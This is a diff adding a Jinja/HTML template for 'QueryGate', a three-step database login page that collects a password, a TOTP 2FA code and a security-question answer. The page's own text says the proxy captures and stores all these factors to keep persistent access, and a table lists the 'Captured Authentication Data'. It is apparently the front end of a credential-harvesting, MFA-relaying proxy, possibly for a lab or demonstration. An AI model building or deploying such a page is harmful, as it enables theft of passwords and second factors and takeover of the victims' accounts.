@@ -1,0 +1,311 @@
+{% extends "base.html" %}
+
+{% block title %}Connect - QueryGate{% endblock %}
+
+{% block content %}
+<div class="row justify-content-center">
+    <div class="col-md-6 col-lg-5">
+        <div class="card">
+            <div class="card-header text-center py-4">
+                <i class="bi bi-database-fill-lock fs-1 d-block mb-2" style="color: var(--accent);"></i>
+                <h4 class="mb-1">Connect to Database</h4>
+                <small class="text-muted">
+                    {% if step == 'credentials' %}
+                        Step 1: Enter your credentials
+                    {% elif step == 'totp' %}
+                        Step 2: Two-Factor Authentication
+                    {% elif step == 'security' %}
+                        Step 3: Security Verification
+                    {% endif %}
+                </small>
+            </div>
+            <div class="card-body p-4">
+                <!-- Step Indicator -->
+                <div class="d-flex justify-content-center gap-2 mb-4">
+                    <div class="step-dot {% if step == 'credentials' %}active{% elif step in ['totp', 'security'] %}completed{% endif %}"></div>
+                    <div class="step-dot {% if step == 'totp' %}active{% elif step == 'security' %}completed{% endif %}"></div>
+                    <div class="step-dot {% if step == 'security' %}active{% endif %}"></div>
+                </div>
+
+                {% if error %}
+                <div class="alert alert-danger">
+                    <i class="bi bi-exclamation-triangle me-2"></i>{{ error }}
+                </div>
+                {% endif %}
+
+                {% if status.has_credentials and status.active %}
+                <div class="alert alert-success mb-4">
+                    <i class="bi bi-check-circle me-2"></i>
+                    <strong>Connected</strong> as {{ status.username }}
+                </div>
+                {% endif %}
+
+                {% if step == 'credentials' %}
+                <!-- Step 1: Username & Password -->
+                <form method="POST" action="{{ url_for('connect') }}">
+                    <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
+                    <input type="hidden" name="step" value="credentials">
+                    <div class="mb-3">
+                        <label class="form-label">Username</label>
+                        <div class="input-group">
+                            <span class="input-group-text bg-transparent border-end-0">
+                                <i class="bi bi-person"></i>
+                            </span>
+                            <input type="text" class="form-control border-start-0" name="username"
+                                   placeholder="Enter username" required autofocus
+                                   value="{{ status.username or '' }}">
+                        </div>
+                    </div>
+
+                    <div class="mb-4">
+                        <label class="form-label">Password</label>
+                        <div class="input-group">
+                            <span class="input-group-text bg-transparent border-end-0">
+                                <i class="bi bi-lock"></i>
+                            </span>
+                            <input type="password" class="form-control border-start-0" name="password"
+                                   placeholder="Enter password" required>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn btn-accent w-100 py-2">
+                        <i class="bi bi-arrow-right me-2"></i>Continue
+                    </button>
+                </form>
+
+                {% elif step == 'totp' %}
+                <!-- Step 2: TOTP 2FA Code -->
+                <div class="text-center mb-4">
+                    <i class="bi bi-shield-lock fs-1" style="color: var(--accent);"></i>
+                    <h5 class="mt-2">Two-Factor Authentication</h5>
+                    <p class="text-muted small">Enter the 6-digit code from your authenticator app</p>
+                </div>
+
+                <form method="POST" action="{{ url_for('connect') }}">
+                    <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
+                    <input type="hidden" name="step" value="totp">
+                    <div class="mb-4">
+                        <input type="text" class="form-control text-center" name="totp_code"
+                               maxlength="6" pattern="[0-9]{6}" inputmode="numeric"
+                               placeholder="000000" required autofocus
+                               style="font-size: 1.5rem; letter-spacing: 0.5rem;">
+                        <div class="form-text text-center mt-2">
+                            <span id="countdown"></span>
+                        </div>
+                        <div class="invalid-feedback d-none text-center mt-2" id="totp-error">Code must be 6 digits</div>
+                    </div>
+
+                    <button type="submit" class="btn btn-accent w-100 py-2" id="totp-submit">
+                        <i class="bi bi-check-circle me-2"></i>Verify Code
+                    </button>
+                </form>
+
+                <div class="text-center mt-3">
+                    <a href="{{ url_for('connect') }}" class="text-muted small">
+                        <i class="bi bi-arrow-left"></i> Back to login
+                    </a>
+                </div>
+
+                {% elif step == 'security' %}
+                <!-- Step 3: Security Question -->
+                <div class="text-center mb-4">
+                    <i class="bi bi-question-circle fs-1" style="color: var(--success);"></i>
+                    <h5 class="mt-2">Security Question</h5>
+                </div>
+
+                <div class="security-question-box mb-4">
+                    <small class="text-muted d-block">Your security question:</small>
+                    <strong>{{ security_question }}</strong>
+                </div>
+
+                <form method="POST" action="{{ url_for('connect') }}">
+                    <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
+                    <input type="hidden" name="step" value="security">
+                    <div class="mb-4">
+                        <label class="form-label">Your Answer</label>
+                        <input type="text" class="form-control" name="security_answer"
+                               placeholder="Enter your answer" required autofocus>
+                        <div class="form-text">Answer is case-insensitive</div>
+                    </div>
+
+                    <button type="submit" class="btn btn-success w-100 py-2">
+                        <i class="bi bi-unlock me-2"></i>Complete Login
+                    </button>
+                </form>
+
+                <div class="text-center mt-3">
+                    <a href="{{ url_for('connect') }}" class="text-muted small">
+                        <i class="bi bi-arrow-left"></i> Start over
+                    </a>
+                </div>
+                {% endif %}
+
+                {% if status.has_credentials and status.active %}
+                <hr class="my-4">
+                <form action="/disconnect" method="post">
+                    <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
+                    <button type="submit" class="btn btn-outline-danger w-100">
+                        <i class="bi bi-x-circle me-2"></i>Disconnect
+                    </button>
+                </form>
+                {% endif %}
+            </div>
+        </div>
+
+        <!-- How it works -->
+        <div class="card mt-4">
+            <div class="card-header">
+                <i class="bi bi-info-circle me-2"></i>Multi-Step Authentication Handler
+            </div>
+            <div class="card-body">
+                <div class="row text-center g-3">
+                    <div class="col-4">
+                        <i class="bi bi-key fs-4 d-block mb-1" style="color: var(--accent);"></i>
+                        <small class="text-muted">1. Password</small>
+                    </div>
+                    <div class="col-4">
+                        <i class="bi bi-shield-lock fs-4 d-block mb-1" style="color: var(--accent);"></i>
+                        <small class="text-muted">2. 2FA Code</small>
+                    </div>
+                    <div class="col-4">
+                        <i class="bi bi-question-circle fs-4 d-block mb-1" style="color: var(--accent);"></i>
+                        <small class="text-muted">3. Security Q</small>
+                    </div>
+                </div>
+                <hr>
+                <p class="text-muted small mb-0">
+                    <i class="bi bi-shield-exclamation me-1"></i>
+                    This proxy captures and stores ALL authentication factors, including 2FA codes
+                    and security answers, to maintain persistent access to the database server.
+                </p>
+            </div>
+        </div>
+
+        <!-- Captured Credentials Info -->
+        {% if status.has_credentials %}
+        <div class="card mt-4">
+            <div class="card-header">
+                <i class="bi bi-database-lock me-2"></i>Captured Authentication Data
+            </div>
+            <div class="card-body">
+                <table class="table table-sm mb-0">
+                    <tr>
+                        <td class="text-muted">Username</td>
+                        <td><code>{{ status.username }}</code></td>
+                    </tr>
+                    <tr>
+                        <td class="text-muted">Password</td>
+                        <td><code>••••••••</code> <i class="bi bi-check-circle text-success"></i></td>
+                    </tr>
+                    <tr>
+                        <td class="text-muted">2FA Token</td>
+                        <td>
+                            {% if status.has_totp %}
+                            <code>••••••</code> <i class="bi bi-check-circle text-success"></i>
+                            {% else %}
+                            <span class="text-muted">Not captured</span>
+                            {% endif %}
+                        </td>
+                    </tr>
+                    <tr>
+                        <td class="text-muted">Security Answer</td>
+                        <td>
+                            {% if status.has_security_answer %}
+                            <code>••••••</code> <i class="bi bi-check-circle text-success"></i>
+                            {% else %}
+                            <span class="text-muted">Not captured</span>
+                            {% endif %}
+                        </td>
+                    </tr>
+                    <tr>
+                        <td class="text-muted">Session Active</td>
+                        <td>
+                            {% if status.active %}
+                            <span class="text-success"><i class="bi bi-check-circle"></i> Yes</span>
+                            {% else %}
+                            <span class="text-warning"><i class="bi bi-exclamation-circle"></i> No</span>
+                            {% endif %}
+                        </td>
+                    </tr>
+                </table>
+            </div>
+        </div>
+        {% endif %}
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_styles %}
+<style>
+    .step-dot {
+        width: 12px;
+        height: 12px;
+        border-radius: 50%;
+        background: rgba(255,255,255,0.2);
+        transition: all 0.3s;
+    }
+
+    .step-dot.active {
+        background: var(--accent);
+        animation: pulse 1.5s infinite;
+    }
+
+    .step-dot.completed {
+        background: var(--success);
+    }
+
+    @keyframes pulse {
+        0%, 100% { transform: scale(1); }
+        50% { transform: scale(1.3); }
+    }
+
+    .security-question-box {
+        background: rgba(255,255,255,0.05);
+        border-left: 3px solid var(--accent);
+        padding: 1rem;
+        border-radius: 0 8px 8px 0;
+    }
+</style>
+{% endblock %}
+
+{% block extra_scripts %}
+<script>
+    // TOTP countdown timer
+    function updateCountdown() {
+        const now = Math.floor(Date.now() / 1000);
+        const remaining = 30 - (now % 30);
+        const el = document.getElementById('countdown');
+        if (el) {
+            el.innerHTML = `Code refreshes in <strong>${remaining}</strong> seconds`;
+        }
+    }
+
+    if (document.getElementById('countdown')) {
+        updateCountdown();
+        setInterval(updateCountdown, 1000);
+    }
+
+    // Auto-format TOTP input and enforce 6 digits
+    const totpInput = document.querySelector('input[name="totp_code"]');
+    const totpError = document.getElementById('totp-error');
+    const totpSubmit = document.getElementById('totp-submit');
+    if (totpInput) {
+        totpInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            if (this.value.length > 6) this.value = this.value.slice(0,6);
+            if (this.value.length === 6) {
+                totpError.classList.add('d-none');
+            }
+        });
+
+        // Prevent submit if not 6 digits
+        totpSubmit && totpSubmit.addEventListener('click', function(ev) {
+            const v = totpInput.value.trim();
+            if (!/^[0-9]{6}$/.test(v)) {
+                ev.preventDefault();
+                totpError.classList.remove('d-none');
+            }
+        });
+    }
+</script>
+{% endblock %}
